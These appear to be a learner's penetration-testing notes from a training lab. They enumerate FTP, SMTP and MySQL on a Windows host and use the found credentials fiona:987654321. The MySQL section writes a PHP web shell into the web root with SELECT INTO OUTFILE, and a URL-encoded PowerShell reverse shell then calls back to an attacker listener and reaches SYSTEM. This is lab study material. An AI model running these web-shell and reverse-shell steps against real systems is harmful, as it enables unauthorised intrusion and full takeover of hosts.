### FTP - Port 21
We can access with fiona:987654321 and here we find two files with the following content

```plain/text
Docs.txt:

	"I'm testing the FTP using HTTPS, everything looks good."
WebServersInfo.txt 
	CoreFTP:
	Directory C:\CoreFTP
	Ports: 21 & 443
	Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt
	
	Apache
	Directory "C:\xampp\htdocs\"
	Ports: 80 & 4443
	Test Command: curl http://localhost/test.php
```

I have been trying to upload php shells through ftp and invoking them executing `curl -k -H "Host: 10.129.203.7" --basic -u fiona:987654321 https://10.129.203.7/shell.php` but this just download the file so it's not valid

### SMTP - Ports 25, 587
With `smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.12` we find the user fiona@inlanefreight.htb:987654321 (password found with hydra)

### HTTP/HTTPS - Ports 80, 443


### MySQL - Port 3306
With fiona:987654321 we can go in and publish a php backdoor shell with the following command `SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"`

Then accessing it through the browser we can execute commands
http://10.129.203.7/backdoor.php?cmd=whoami

![[Pasted image 20230817124433.png]]

With the **[Rev shells generator](https://www.revshells.com/)** code (using PowerShell #2 for Windows) and using a **[url encoder](https://www.urlencoder.org/)** we got a full shell

```bash

URL:
http://10.129.203.7/backdoor.php?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.16.54%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22


-----------------------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234            
listening on [any] 1234 ...
connect to [10.10.16.54] from (UNKNOWN) [10.129.203.7] 49679
whoami
nt authority\system
```


### RDP - Port 3389
